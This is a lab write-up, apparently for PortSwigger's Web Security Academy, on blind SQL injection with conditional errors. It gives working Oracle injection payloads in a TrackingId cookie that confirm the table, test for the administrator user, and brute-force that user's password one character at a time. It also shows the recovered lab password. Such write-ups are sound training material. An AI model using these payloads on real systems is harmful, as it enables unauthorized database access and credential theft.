# SQL Injection - Blind SQLi with Conditional Errors

## 📌 Lab Details
- **Title**: Blind SQL Injection with Conditional Errors
- **Difficulty**: Practitioner
- **Category**: SQL Injection
- **Lab URL**: https://portswigger.net/academy/labs/launch/9622f310ce0fc2a85821811f98f2be7b23e049667d49d018ca28f06dc0b7875a?referrer=%2fweb-security%2fsql-injection%2fblind%2flab-conditional-errors

## 🔍 Summary
This lab demonstrated how Blind SQLi with conditional errors can be used to brute force a password.

## 🛠 Steps to Solve
1. Confirm that the server is interpreting the injection as a SQL query `TrackingId=6TldpyJ233EjIRZJ'||(SELECT '' from DUAL)||'`.
2. Verify that the `users` table exists `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`. (Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break our concatenation.)
3. Now trigger an error conditionally `TrackingId=xyz'||(SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`.
4. Now we will use this behavior to test whether the username `administrator` exist in the table `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`.
5. Determine the number of characters in the password with the help of a `sniper` attack `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
   -> password is exactly `20` characters.
6. Determining the complete password using a `cluster bomb` attack `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
   -> password is `in76qgy59o8uoib0bgj9`
   
## 📖 Key Takeaways
- Understanding how blind SQLi works
- Understanding how to trigger an error conditionally
- Understanding how to implement `brute force` attack with the help of `intruder`
  
## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/b25fd76d-bb6c-4768-a119-5d8c8a189e5d)
![image](https://github.com/user-attachments/assets/47bc8f20-390e-49f6-a299-6ed921ee5a04)
![image](https://github.com/user-attachments/assets/02b8f86c-7fe9-46f2-bc61-93de3aaf74d9)
![image](https://github.com/user-attachments/assets/da37f4a2-8db9-4eb5-aa1c-bef87d925cc1)
![image](https://github.com/user-attachments/assets/5c707d3e-215e-44eb-853e-057c1dc13b13)
![image](https://github.com/user-attachments/assets/58f226c2-742d-4d86-995c-178e0fea87f6)
![image](https://github.com/user-attachments/assets/00105eb5-4811-4879-a65e-e2d3f39042b1)
![image](https://github.com/user-attachments/assets/9f343cb7-8cd2-4cad-9716-677542f6335b)
![image](https://github.com/user-attachments/assets/709b1d79-d70f-4086-a988-ef4e9f78035b)
![image](https://github.com/user-attachments/assets/e0c608d7-a45a-4008-ad6d-ab304264a07f)
